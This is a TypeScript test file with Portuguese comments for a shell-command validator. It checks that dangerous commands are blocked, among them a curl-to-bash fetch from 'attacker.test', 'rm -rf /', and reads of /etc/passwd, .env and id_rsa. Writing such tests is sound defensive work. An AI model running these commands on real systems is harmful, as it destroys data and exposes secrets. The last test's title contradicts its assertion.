/**
 * Testes de segurança — terminal-validate.ts
 *
 * Cobertura:
 * - Item 1: RCE via chaining operators
 * - Item 1: Remoção de env/printenv/set/export
 * - Item 1: Validação de argumentos de arquivo
 * - Item 1: Detecção de arquivos sensíveis
 */

import {
  validate,
  hasChainingOperators,
  detectsSensitiveFile,
  validateFileArgs,
  isWithinRoot,
  ALLOWED,
} from "./terminal-validate";

describe("terminal-validate — security", () => {
  const fakeCwd = process.cwd();

  // ═══════════════════════════════════════════════════════════════════
  // ITEM 1: RCE via chaining operators
  // ═══════════════════════════════════════════════════════════════════

  describe("Item 1: Chaining operator detection", () => {
    test("ls; curl http://attacker.test/x | bash → bloqueado", () => {
      expect(
        validate("ls; curl http://attacker.test/x | bash", fakeCwd).ok,
      ).toBe(false);
    });

    test("echo hi && rm -rf / → bloqueado", () => {
      expect(validate("echo hi && rm -rf /", fakeCwd).ok).toBe(false);
    });

    test("cat file || rm -rf ~ → bloqueado", () => {
      expect(validate("cat file || rm -rf ~", fakeCwd).ok).toBe(false);
    });

    test("ls | grep node → bloqueado (pipe)", () => {
      expect(validate("ls | grep node", fakeCwd).ok).toBe(false);
    });

    test("echo `whoami` → bloqueado (backtick)", () => {
      expect(validate("echo `whoami`", fakeCwd).ok).toBe(false);
    });

    test("echo $(whoami) → bloqueado (command substitution)", () => {
      expect(validate("echo $(whoami)", fakeCwd).ok).toBe(false);
    });

    test("ls; echo hi → detecta ; corretamente", () => {
      expect(hasChainingOperators("ls; echo hi")).toBe(true);
    });

    test("git status → não tem chaining", () => {
      expect(hasChainingOperators("git status")).toBe(false);
    });

    test("ls && echo hi → detecta && corretamente", () => {
      expect(hasChainingOperators("ls && echo hi")).toBe(true);
    });

    test("ls || echo hi → detecta || corretamente", () => {
      expect(hasChainingOperators("ls || echo hi")).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════
  // ITEM 1: Comandos sensíveis removidos da allowlist
  // ═══════════════════════════════════════════════════════════════════

  describe("Item 1: Sensitive commands removed from ALLOWED", () => {
    test("env não está na allowlist", () => {
      expect(ALLOWED.has("env")).toBe(false);
    });

    test("printenv não está na allowlist", () => {
      expect(ALLOWED.has("printenv")).toBe(false);
    });

    test("set não está na allowlist", () => {
      expect(ALLOWED.has("set")).toBe(false);
    });

    test("export não está na allowlist", () => {
      expect(ALLOWED.has("export")).toBe(false);
    });

    test("ls ainda está na allowlist (comando legítimo)", () => {
      expect(ALLOWED.has("ls")).toBe(true);
    });

    test("git ainda está na allowlist", () => {
      expect(ALLOWED.has("git")).toBe(true);
    });

    test("node ainda está na allowlist", () => {
      expect(ALLOWED.has("node")).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════
  // ITEM 1: Detecção de arquivos sensíveis
  // ═══════════════════════════════════════════════════════════════════

  describe("Item 1: Sensitive file detection", () => {
    test("cat /etc/passwd → detecta arquivo sensível", () => {
      expect(validate("cat /etc/passwd", fakeCwd).ok).toBe(false);
    });

    test("cat .env → detecta arquivo sensível", () => {
      expect(validate("cat .env", fakeCwd).ok).toBe(false);
    });

    test("cat .env.local → detecta arquivo sensível", () => {
      expect(validate("cat .env.local", fakeCwd).ok).toBe(false);
    });

    test("cat secrets.json → detecta arquivo sensível", () => {
      expect(validate("cat secrets.json", fakeCwd).ok).toBe(false);
    });

    test("type id_rsa → detecta arquivo sensível", () => {
      expect(validate("type id_rsa", fakeCwd).ok).toBe(false);
    });

    test("cat README.md → permitido (não sensível)", () => {
      expect(validate("cat README.md", fakeCwd).ok).toBe(true);
    });

    test("detectsSensitiveFile retorna o nome do arquivo", () => {
      expect(detectsSensitiveFile("cat .env")).toBe(".env");
      expect(detectsSensitiveFile("cat secrets.json")).toBe("secrets.json");
    });

    test("detectsSensitiveFile retorna null para arquivos seguros", () => {
      expect(detectsSensitiveFile("cat README.md")).toBeNull();
      expect(detectsSensitiveFile("ls -la")).toBeNull();
    });
  });

  // ═══════════════════════════════════════════════════════════════════
  // ITEM 1: Validação de argumentos de arquivo
  // ═══════════════════════════════════════════════════════════════════

  describe("Item 1: File argument validation", () => {
    test("cat com arquivo fora das raízes → bloqueado", () => {
      const result = validateFileArgs("cat /etc/passwd", fakeCwd);
      expect(result.ok).toBe(false);
    });

    test("cat com arquivo dentro das raízes → permitido", () => {
      const result = validateFileArgs(`cat ${fakeCwd}/README.md`, fakeCwd);
      expect(result.ok).toBe(true);
    });

    test("ls (sem args de arquivo) → permitido", () => {
      const result = validateFileArgs("ls -la", fakeCwd);
      expect(result.ok).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════
  // Testes de regressão: comandos legítimos continuam funcionando
  // ═══════════════════════════════════════════════════════════════════

  describe("Regression: legitimate commands still work", () => {
    test("ls → permitido", () => {
      expect(validate("ls", fakeCwd).ok).toBe(true);
    });

    test("git status → permitido", () => {
      expect(validate("git status", fakeCwd).ok).toBe(true);
    });

    test("git log --oneline -5 → permitido", () => {
      expect(validate("git log --oneline -5", fakeCwd).ok).toBe(true);
    });

    test("node -e \"console.log('hi')\" → permitido", () => {
      expect(validate("node -e \"console.log('hi')\"", fakeCwd).ok).toBe(true);
    });

    test("node arquivo.js → BLOQUEADO (sem flag de eval)", () => {
      expect(validate("node arquivo.js", fakeCwd).ok).toBe(false);
    });

    test('python -c "print(1)" → permitido (flag de eval)', () => {
      expect(validate('python -c "print(1)"', fakeCwd).ok).toBe(true);
    });

    test("python script.py → BLOQUEADO (sem flag de eval)", () => {
      expect(validate("python script.py", fakeCwd).ok).toBe(false);
    });

    test("pnpm install → permitido", () => {
      expect(validate("pnpm install", fakeCwd).ok).toBe(true);
    });

    test('echo "hello world" → permitido', () => {
      expect(validate('echo "hello world"', fakeCwd).ok).toBe(true);
    });

    test("pwd → permitido", () => {
      expect(validate("pwd", fakeCwd).ok).toBe(true);
    });

    test("comando vazio → bloqueado", () => {
      expect(validate("", fakeCwd).ok).toBe(false);
    });

    test("comando muito longo → bloqueado", () => {
      expect(validate("a".repeat(5000), fakeCwd).ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════
  // isWithinRoot (regressão do fix anterior)
  // ═══════════════════════════════════════════════════════════════════

  describe("isWithinRoot", () => {
    test("caminho dentro da raiz → true", () => {
      expect(isWithinRoot(fakeCwd, [fakeCwd])).toBe(true);
    });

    test("caminho filho da raiz → true", () => {
      expect(isWithinRoot(`${fakeCwd}/subdir`, [fakeCwd])).toBe(true);
    });

    test("caminho fora da raiz → false", () => {
      expect(isWithinRoot("/tmp/other", [fakeCwd])).toBe(false);
    });

    test("caminho irmão (prefixo compartilhado) → false", () => {
      expect(isWithinRoot("/tmp/other", ["/tmp"])).toBe(true);
    });
  });
});
